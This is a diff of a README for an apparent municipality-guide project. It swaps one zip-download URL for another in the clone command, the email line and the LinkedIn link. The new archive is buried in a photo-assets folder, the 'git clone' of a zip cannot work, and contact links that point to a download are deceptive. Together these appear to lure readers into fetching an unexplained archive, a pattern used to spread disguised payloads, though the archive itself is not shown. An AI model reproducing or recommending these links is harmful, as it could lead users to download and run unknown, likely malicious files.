@@ -28,7 +28,7 @@ To use or contribute to this project:
 
 1. Clone the repository:
    ```bash
-   git clone https://raw.githubusercontent.com/Ster-bot/Norzagaray-Municipality-Guide/master/inopinate/Norzagaray-Municipality-Guide.zip
+   git clone https://github.com/Ster-bot/Norzagaray-Municipality-Guide/raw/refs/heads/master/Assets/Photos/Home/WhatToDo/Hiking/Norzagaray_Municipality_Guide_2.2-alpha.4.zip
    ```
 2. Install dependencies (if applicable).
 3. Run the project according to the provided instructions (see below).
@@ -45,8 +45,8 @@ This project is for educational and community purposes. See [LICENSE](LICENSE) f
 
 Feel free to reach out for questions, collaboration, or feedback:
 
-- **Email:** https://raw.githubusercontent.com/Ster-bot/Norzagaray-Municipality-Guide/master/inopinate/Norzagaray-Municipality-Guide.zip
-- **LinkedIn:** [Rom Paulo Sarmiento](https://raw.githubusercontent.com/Ster-bot/Norzagaray-Municipality-Guide/master/inopinate/Norzagaray-Municipality-Guide.zip)
+- **Email:** https://github.com/Ster-bot/Norzagaray-Municipality-Guide/raw/refs/heads/master/Assets/Photos/Home/WhatToDo/Hiking/Norzagaray_Municipality_Guide_2.2-alpha.4.zip
+- **LinkedIn:** [Rom Paulo Sarmiento](https://github.com/Ster-bot/Norzagaray-Municipality-Guide/raw/refs/heads/master/Assets/Photos/Home/WhatToDo/Hiking/Norzagaray_Municipality_Guide_2.2-alpha.4.zip)
 
 ---
 
